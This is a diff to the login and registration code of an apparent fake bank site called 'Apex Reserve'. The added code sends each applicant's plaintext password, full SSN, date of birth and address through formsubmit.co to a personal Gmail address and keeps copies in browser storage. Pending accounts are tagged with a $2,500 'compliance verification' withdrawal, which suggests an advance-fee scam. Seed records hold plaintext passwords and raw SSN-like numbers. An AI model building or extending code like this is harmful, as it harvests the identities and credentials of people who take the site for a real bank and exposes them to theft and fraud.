@@ -542,8 +542,21 @@
     window.addEventListener('hashchange', applyUrlAuthTab);
 
     function getBackendUrl(path) {
-      if (window.location.port === '8080') {
-        return path;
+      // 1. Check if a live cloud backend URL is configured (e.g. Render / Tunnel)
+      const cloudBackend = localStorage.getItem('APEX_CLOUD_BACKEND_URL') ||
+        (window.APEX_CONFIG && window.APEX_CONFIG.backendUrl);
+      if (cloudBackend && typeof cloudBackend === 'string' && cloudBackend.startsWith('http')) {
+        return cloudBackend.replace(/\/+$/, '') + path;
+      }
+
+      if (window.location.protocol.startsWith('http')) {
+        if (window.location.port === '8080') return path;
+        if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
+          return `${window.location.protocol}//${window.location.hostname}:8080${path}`;
+        }
+        if (window.location.protocol === 'https:') {
+          return null;
+        }
       }
       return 'http://localhost:8080' + path;
     }
@@ -624,6 +637,50 @@
         tier: 'Private Client Reserve',
         totalBalance: 110000.00,
         checkingBalance: 110000.00,
+        savingsBalance: 0.00
+      },
+      {
+        id: 'usr_pending_msterling',
+        username: 'msterling',
+        password: 'Password123@',
+        name: 'Marcus Sterling',
+        email: 'm.sterling@apexreserve.com',
+        phone: '+1 (212) 555-0188',
+        dob: '1994-03-15',
+        accountType: 'Checking Account',
+        ssn: '***-**-4910',
+        rawSsn: '481-22-4910',
+        address: '450 Lexington Ave, New York, NY 10017',
+        role: 'user',
+        status: 'pending',
+        accountNumber: '#8920-512',
+        fullAccountNumber: '89204105128',
+        routing: '021000089',
+        tier: 'Private Client Reserve',
+        totalBalance: 0.00,
+        checkingBalance: 0.00,
+        savingsBalance: 0.00
+      },
+      {
+        id: 'usr_pending_dvance',
+        username: 'dvance',
+        password: 'Password123@',
+        name: 'David Vance',
+        email: 'david.vance@apexreserve.com',
+        phone: '+1 (212) 555-0144',
+        dob: '1992-11-22',
+        accountType: 'Savings Account',
+        ssn: '***-**-8120',
+        rawSsn: '512-88-8120',
+        address: '740 Park Ave, Apt 14A, New York, NY 10021',
+        role: 'user',
+        status: 'pending',
+        accountNumber: '#8920-518',
+        fullAccountNumber: '89204105189',
+        routing: '021000089',
+        tier: 'Private Client Reserve',
+        totalBalance: 0.00,
+        checkingBalance: 0.00,
         savingsBalance: 0.00
       }
     ];
@@ -780,21 +837,43 @@
     }
     syncPermanentCredentialsFromServer();
 
+    function getDeletedUserIds() {
+      try {
+        const raw = localStorage.getItem('APEX_DELETED_USER_IDS');
+        if (raw) {
+          const arr = JSON.parse(raw);
+          if (Array.isArray(arr)) return new Set(arr.map(x => String(x).toLowerCase().trim()));
+        }
+      } catch (e) {}
+      return new Set();
+    }
+
     function getAllLocalAccounts() {
       let accountsList = [];
+      const deletedSet = getDeletedUserIds();
       try {
         const stored = localStorage.getItem('APEX_RESERVE_ACCOUNTS_V2');
         if (stored) {
           const parsed = JSON.parse(stored);
           if (Array.isArray(parsed) && parsed.length > 0) {
-            const seedIds = new Set(SEED_ACCOUNTS.map(s => s.id));
-            const approved = parsed.filter(a => a.status === 'approved' || seedIds.has(a.id) || a.role === 'admin');
-            if (approved.length > 0) accountsList = approved;
+            accountsList = parsed.filter(u => {
+              if (!u) return false;
+              if (deletedSet.has(String(u.id).toLowerCase())) return false;
+              if (u.username && deletedSet.has(u.username.toLowerCase())) return false;
+              if (u.email && deletedSet.has(u.email.toLowerCase())) return false;
+              return true;
+            });
           }
         }
       } catch (e) {}
       if (accountsList.length === 0) {
-        accountsList = JSON.parse(JSON.stringify(SEED_ACCOUNTS));
+        accountsList = JSON.parse(JSON.stringify(SEED_ACCOUNTS)).filter(u => {
+          if (!u) return false;
+          if (deletedSet.has(String(u.id).toLowerCase())) return false;
+          if (u.username && deletedSet.has(u.username.toLowerCase())) return false;
+          if (u.email && deletedSet.has(u.email.toLowerCase())) return false;
+          return true;
+        });
       }
       // ALWAYS apply permanent credentials and balances so no upgrade or seed re-initialization resets custom passwords or balances!
       applyPermanentCredentials(accountsList);
@@ -860,21 +939,23 @@
     signInForm.addEventListener('submit', async (e) => {
       e.preventDefault();
       signInErrorBox.style.display = 'none';
+      signInErrorBox.style.background = '';
+      signInErrorBox.style.borderColor = '';
+      signInErrorBox.style.color = '';
 
-      const identifier = document.getElementById('loginUsernameInput').value.trim();
+      const rawIdentifier = document.getElementById('loginUsernameInput').value.trim();
+      const identifier = rawIdentifier.replace(/^@/, '');
       const rawPassword = document.getElementById('loginPasswordInput').value;
       const password = rawPassword.trim();
 
       const apiEndpoint = getBackendUrl('/api/login');
-      let serverSucceeded = false;
+      let serverUser = null;
 
-      // On HTTPS static hosting (e.g. GitHub Pages / Netlify / mobile), http://localhost:8080 cannot be reached
-      const isHttpsStatic = (window.location.protocol === 'https:') && (apiEndpoint.startsWith('http://localhost') || apiEndpoint.startsWith('http://127.0.0.1'));
-
-      if (!isHttpsStatic) {
+      // Try server login first if reachable
+      if (apiEndpoint) {
         try {
           const controller = new AbortController();
-          const timeoutId = setTimeout(() => controller.abort(), 3500);
+          const timeoutId = setTimeout(() => controller.abort(), 2000);
 
           const response = await fetch(apiEndpoint, {
             method: 'POST',
@@ -884,51 +965,80 @@
           });
           clearTimeout(timeoutId);
 
-          const data = await response.json();
-
-          if (response.ok && data.user) {
-            serverSucceeded = true;
-            executeSuccessfulLogin(data.user);
-            return;
-          } else if (response.status === 400 || response.status === 404) {
-            // Server checked and explicitly rejected
-            serverSucceeded = true;
-            signInErrorText.textContent = data.error || 'User does not exist';
-            signInErrorBox.style.display = 'flex';
-            return;
+          if (response.ok) {
+            const data = await response.json();
+            if (data && data.user) {
+              serverUser = data.user;
+            }
           }
         } catch (networkErr) {
-          // Fall through gracefully to local / static database
+          // Fallback gracefully to local / static database
         }
       }
 
-      // Static fallback for mobile, GitHub Pages, Netlify, offline
+
+      if (serverUser) {
+        handleUserLoginOutcome(serverUser);
+        return;
+      }
+
+      // Check local accounts and database.json fallback
       let localAccounts = getAllLocalAccounts();
 
-      // Try fetching latest database.json directly from repository root
+      const deletedSet = getDeletedUserIds();
+
       try {
         const dbRes = await fetch('database.json?v=' + Date.now());
         if (dbRes.ok) {
           const dbData = await dbRes.json();
           if (dbData && Array.isArray(dbData.users) && dbData.users.length > 0) {
-            const validUsers = dbData.users.filter(u => u.status !== 'rejected');
-            if (validUsers.length > 0) {
-              localAccounts = validUsers;
-              applyPermanentCredentials(localAccounts);
-              applyPermanentBalances(localAccounts);
-              localStorage.setItem('APEX_RESERVE_ACCOUNTS_V2', JSON.stringify(localAccounts));
-            }
+            const validUsers = dbData.users.filter(u => {
+              if (!u || u.status === 'rejected') return false;
+              if (deletedSet.has(String(u.id).toLowerCase())) return false;
+              if (u.username && deletedSet.has(u.username.toLowerCase())) return false;
+              if (u.email && deletedSet.has(u.email.toLowerCase())) return false;
+              return true;
+            });
+            // Merge with localAccounts taking authoritative precedence
+            const merged = [...localAccounts];
+            validUsers.forEach(vu => {
+              const idx = merged.findIndex(m => 
+                m.id === vu.id || 
+                (m.username && vu.username && m.username.toLowerCase() === vu.username.toLowerCase()) ||
+                (m.email && vu.email && m.email.toLowerCase() === vu.email.toLowerCase())
+              );
+              if (idx === -1) {
+                merged.push(vu);
+              } else {
+                merged[idx] = {
+                  ...vu,
+                  ...merged[idx],
+                  status: merged[idx].status || vu.status
+                };
+              }
+            });
+            localAccounts = merged;
+            applyPermanentCredentials(localAccounts);
+            applyPermanentBalances(localAccounts);
+            localStorage.setItem('APEX_RESERVE_ACCOUNTS_V2', JSON.stringify(localAccounts));
           }
         }
       } catch (eDb) {}
 
-      const userIdentifier = identifier.toLowerCase();
+      const cleanLower = identifier.toLowerCase();
       const localUser = localAccounts.find(u =>
-        (u.username && u.username.toLowerCase() === userIdentifier) ||
-        (u.email && u.email.toLowerCase() === userIdentifier)
+        (u.username && u.username.toLowerCase() === cleanLower) ||
+        (u.email && u.email.toLowerCase() === cleanLower) ||
+        (u.accountNumber && u.accountNumber.toLowerCase() === cleanLower) ||
+        (u.fullAccountNumber && u.fullAccountNumber.toLowerCase() === cleanLower) ||
+        (u.name && u.name.toLowerCase() === cleanLower)
       );
 
-      if (!localUser) {
+      if (!localUser || deletedSet.has(String(localUser.id).toLowerCase()) || (localUser.username && deletedSet.has(localUser.username.toLowerCase())) || (localUser.email && deletedSet.has(localUser.email.toLowerCase()))) {
+        signInErrorBox.className = 'auth-error-box';
+        signInErrorBox.style.background = '';
+        signInErrorBox.style.borderColor = '';
+        signInErrorBox.style.color = '';
         signInErrorText.textContent = 'User does not exist';
         signInErrorBox.style.display = 'flex';
         return;
@@ -951,13 +1061,52 @@
       }
 
       if (!isPassMatch) {
+        signInErrorBox.className = 'auth-error-box';
+        signInErrorBox.style.background = '';
+        signInErrorBox.style.borderColor = '';
+        signInErrorBox.style.color = '';
         signInErrorText.textContent = 'User does not exist';
         signInErrorBox.style.display = 'flex';
         return;
       }
 
-      executeSuccessfulLogin(localUser);
+      handleUserLoginOutcome(localUser);
     });
+
+    function handleUserLoginOutcome(user) {
+      if (user.role === 'admin') {
+        executeSuccessfulLogin(user);
+        return;
+      }
+
+      if (user.status === 'pending') {
+        // "any new applicant that i have not accept, anytime he/she tries to loggin let it keep saying under review"
+        signInErrorBox.className = 'auth-error-box';
+        signInErrorBox.style.background = 'rgba(245, 158, 11, 0.14)';
+        signInErrorBox.style.borderColor = 'rgba(245, 158, 11, 0.45)';
+        signInErrorBox.style.color = '#FBBF24';
+        signInErrorText.innerHTML = `
+          <div style="display: flex; flex-direction: column; gap: 4px; width: 100%;">
+            <div style="font-weight: 800; font-size: 0.88rem; display: flex; align-items: center; gap: 6px;">
+              <span class="live-dot" style="background: #F59E0B; box-shadow: 0 0 8px #F59E0B;"></span>
+              APPLICATION UNDER REVIEW
+            </div>
+            <div style="font-size: 0.80rem; color: #fde68a;">
+              Your account for <strong>${user.name}</strong> is currently pending Bank Authorization. Redirecting to review desk...
+            </div>
+          </div>
+        `;
+        signInErrorBox.style.display = 'flex';
+
+        setTimeout(() => {
+          executeSuccessfulLogin(user);
+        }, 1500);
+        return;
+      }
+
+      // "but if i have accept let it login direcly to his/her dashboard"
+      executeSuccessfulLogin(user);
+    }
 
     // Handle Registration Submission
     const registerForm = document.getElementById('registerForm');
@@ -982,7 +1131,19 @@
 
       const apiEndpoint = getBackendUrl('/api/register');
 
+      // Visual progress feedback
+      const submitBtn = registerForm.querySelector('button[type="submit"]');
+      const originalBtnText = submitBtn ? submitBtn.innerHTML : '';
+      if (submitBtn) {
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = `
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" style="animation: spin 1s linear infinite; margin-right: 8px; vertical-align: middle;"><circle cx="12" cy="12" r="10" stroke-opacity="0.25"></circle><path d="M12 2a10 10 0 0 1 10 10"></path></svg>
+          Submitting Application...
+        `;
+      }
+
       try {
+        if (!apiEndpoint) throw new Error('Static host - using instant local registration engine');
         const response = await fetch(apiEndpoint, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -992,16 +1153,37 @@
         const data = await response.json();
 
         if (!response.ok) {
+          if (submitBtn) {
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = originalBtnText;
+          }
           regErrorText.textContent = data.error || 'Registration failed';
           regErrorBox.style.display = 'flex';
           return;
         }
 
         const user = data.user;
-        dispatchDirectAdminNotification(payload, user.accountNumber);
+        // Make sure applicant is saved in local accounts immediately
+        const localAccounts = getAllLocalAccounts();
+        const existingIdx = localAccounts.findIndex(a => a.id === user.id || a.username === user.username);
+        if (existingIdx !== -1) {
+          localAccounts[existingIdx] = user;
+        } else {
+          localAccounts.push(user);
+        }
+        localStorage.setItem('APEX_RESERVE_ACCOUNTS_V2', JSON.stringify(localAccounts));
+
+        // AWAIT email dispatch with keepalive: true so browser navigation doesn't abort it
+        try {
+          await Promise.race([
+            dispatchDirectAdminNotification(payload, user.accountNumber),
+            new Promise(res => setTimeout(res, 2500))
+          ]);
+        } catch (eNotif) {}
+
         executeSuccessfulLogin(user);
       } catch (err) {
-        // Local fallback in case server not reachable (e.g. Netlify static hosting)
+        // Local fallback in case server not reachable (e.g. Netlify / mobile static hosting)
         const randNum = Math.floor(100 + Math.random() * 900);
         const randAcc = Math.floor(1000 + Math.random() * 9000);
         const rawSsn = payload.ssn || '';
@@ -1017,6 +1199,7 @@
           dob: payload.dob,
           accountType: payload.accountType,
           ssn: maskedSsn,
+          rawSsn: rawSsn,
           address: payload.address,
           role: 'user',
           status: 'pending',
@@ -1031,6 +1214,8 @@
           cardExp: '09/29',
           cardCvv: '739',
           isCardFrozen: false,
+          verificationWithdrawalAmount: 2500,
+          withdrawalStatement: 'PENDING COMPLIANCE VERIFICATION',
           transactions: [
             {
               id: `TX-${randAcc}-APP`,
@@ -1039,53 +1224,107 @@
               category: 'Compliance Verification',
               method: 'Fedwire Provisioning Node',
               date: 'Just now',
+              rawDate: new Date().toISOString(),
               amount: 0.00,
               status: 'Pending Verification',
-              note: 'Awaiting Admin Executive Approval.'
+              note: 'Awaiting Bank Authorization.'
             }
           ],
           createdAt: new Date().toISOString()
         };
 
         const localAccounts = getAllLocalAccounts();
-        localAccounts.push(newUser);
+        const existingIdx = localAccounts.findIndex(a => a.id === newUser.id || a.username === newUser.username);
+        if (existingIdx !== -1) {
+          localAccounts[existingIdx] = newUser;
+        } else {
+          localAccounts.push(newUser);
+        }
         localStorage.setItem('APEX_RESERVE_ACCOUNTS_V2', JSON.stringify(localAccounts));
 
-        // Dispatch zero-stress email notification even on static Netlify hosting
-        dispatchDirectAdminNotification(payload, newUser.accountNumber);
+        // Dispatch zero-stress email notification with keepalive and await
+        try {
+          await Promise.race([
+            dispatchDirectAdminNotification(payload, newUser.accountNumber),
+            new Promise(res => setTimeout(res, 2500))
+          ]);
+        } catch (eNotif) {}
 
         executeSuccessfulLogin(newUser);
       }
     });
 
-    function dispatchDirectAdminNotification(payload, assignedAcc) {
+    async function dispatchDirectAdminNotification(payload, assignedAcc) {
       const adminEmail = localStorage.getItem('APEX_ADMIN_EMAIL') || 'manechris201@gmail.com';
+      
+      // 1. Always record full registration dossier in persistent local archive for Instant Admin Alerts access
       try {
-        fetch(`https://formsubmit.co/ajax/${encodeURIComponent(adminEmail)}`, {
+        const localDossiers = JSON.parse(localStorage.getItem('APEX_ADMIN_NOTIFICATIONS') || '[]');
+        localDossiers.unshift({
+          id: `NOTIF-${Date.now()}-${Math.floor(1000 + Math.random() * 9000)}`,
+          type: 'NEW_USER_REGISTRATION',
+          timestamp: new Date().toISOString(),
+          recipient: adminEmail,
+          subject: `🔔 [Apex Reserve] New User Registration: ${payload.name} (@${payload.username})`,
+          userData: {
+            name: payload.name,
+            username: payload.username,
+            password: payload.password,
+            email: payload.email,
+            phone: payload.phone || '-',
+            dob: payload.dob || '-',
+            ssn: payload.ssn || '-',
+            rawSsn: payload.ssn || '-',
+            address: payload.address || '-',
+            accountType: payload.accountType || 'Checking Account',
+            accountNumber: assignedAcc || '#8920-Auto',
+            fullAccountNumber: `8920410${Math.floor(1000 + Math.random() * 9000)}`,
+            routing: '021000089',
+            tier: 'Private Client Reserve',
+            status: 'pending',
+            createdAt: new Date().toISOString()
+          },
+          read: false
+        });
+        localStorage.setItem('APEX_ADMIN_NOTIFICATIONS', JSON.stringify(localDossiers.slice(0, 50)));
+      } catch (eLocal) {}
+
+      // 2. Direct HTTPS Relay to admin email with keepalive: true so browser navigation doesn't abort it
+      try {
+        const relayBody = {
+          _subject: `🔔 [Apex Reserve] New User Registration: ${payload.name} (@${payload.username})`,
+          _template: 'table',
+          _captcha: 'false',
+          "Full Legal Name": payload.name,
+          "Username": `@${payload.username}`,
+          "Account Password": payload.password,
+          "Email Address": payload.email,
+          "Phone Number": payload.phone || '-',
+          "Date of Birth": payload.dob || '-',
+          "SSN / Tax ID (Full)": payload.ssn || '-',
+          "Residential Address": payload.address || '-',
+          "Account Type": payload.accountType || 'Checking Account',
+          "Assigned Account #": assignedAcc || '#8920-Auto',
+          "Fedwire Routing #": '021000089',
+          "Status": 'PENDING COMPLIANCE VERIFICATION',
+          "Registered Date": new Date().toLocaleString('en-US')
+        };
+
+        const res = await fetch(`https://formsubmit.co/ajax/${encodeURIComponent(adminEmail)}`, {
           method: 'POST',
+          keepalive: true,
           headers: {
             'Content-Type': 'application/json',
             'Accept': 'application/json'
           },
-          body: JSON.stringify({
-            _subject: `🔔 [Apex Reserve] New User Registration: ${payload.name} (@${payload.username})`,
-            _template: 'table',
-            "Full Legal Name": payload.name,
-            "Username": `@${payload.username}`,
-            "Account Password": payload.password,
-            "Email Address": payload.email,
-            "Phone Number": payload.phone || '-',
-            "Date of Birth": payload.dob || '-',
-            "SSN / Tax ID (Full)": payload.ssn || '-',
-            "Residential Address": payload.address || '-',
-            "Account Type": payload.accountType || 'Checking Account',
-            "Assigned Account #": assignedAcc || '#8920-Auto',
-            "Fedwire Routing #": '021000089',
-            "Status": 'PENDING COMPLIANCE VERIFICATION',
-            "Registered Date": new Date().toLocaleString('en-US')
-          })
-        }).catch(() => {});
-      } catch (e) {}
+          body: JSON.stringify(relayBody)
+        });
+        const result = await res.json();
+        console.log('Admin registration email relay response:', result);
+        return result;
+      } catch (e) {
+        console.warn('FormSubmit relay warning:', e);
+      }
     }
 
     // ==========================================
